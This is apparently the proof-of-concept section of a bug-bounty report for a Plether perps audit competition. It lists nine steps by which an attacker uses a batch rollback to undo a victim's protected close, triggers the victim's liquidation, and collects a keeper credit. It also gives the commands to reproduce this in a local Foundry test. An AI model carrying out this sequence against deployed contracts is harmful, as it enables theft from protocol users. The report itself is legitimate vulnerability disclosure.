The PoC is the attached Foundry test RetainedBasketCoverage.t.sol. It deploys the release wrappers, funds the junior tranche, opens the protected position, then follows the batch rollback, normal protection continuation, and liquidation path.

1. Deploy with release settings, fund the junior LP, and open the victim’s protected $10 million long with the $10.02 million ceiling.
2. Queue the attacker’s ordinary $1,000 open behind the protection close.
3. Supply the accepted c+1 and c+2 feed basket through the public batch entrypoint.
4. Execute the batch; assert cache preparation reverts StoredFeedBehind and the outer revert un-settles the already-executed close.
5. After expiry, expire the tail order and protection child, then queue the next attempt through retryPositionProtectionClose.
6. Assert the configured $10.02 million ceiling is carried into the in-flight attempt and owner amendment is unavailable in Triggered status.
7. At P1 = 1.003, assert the close attempt fails with ConstraintViolation.
8. At P2 = 1.012, liquidate through the public route.
9. Assert the attacker’s $5,000 credit and victim’s $87,666.664345 debit.

The fixture uses the accepted c+1/c+2 basket, within the release five-second divergence limit, and synthetic Pyth data through MockPyth. It asserts release settings: $40 million senior cap, 80% share cap, $1,000 minimum open, 2,500 bps adverse-confidence multiplier, 60-second window, and 10 bps liquidation charge with 50% keeper share. The $10.02 million ceiling carries into the normal protection continuation. Attack and control runs use the same prices; the witness is deterministic, not a market-probability claim.

Counterfactual runs show zero attacker credit if the close is not rolled back or the owner amends the limit while Latched. The attack uses $100 internal settlement funding, which remains in the attacker’s account, and consumes 7,022,040 gas in the witness.

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
cp RetainedBasketCoverage.t.sol packages/perps/test/perps/
cd packages/perps
forge test --match-path test/perps/RetainedBasketCoverage.t.sol -vv
```

The existing validation records zero failures across two runs. The test asserts the exact bounty and victim deltas; its local Pyth basket follows the release oracle checks and contacts no public network.
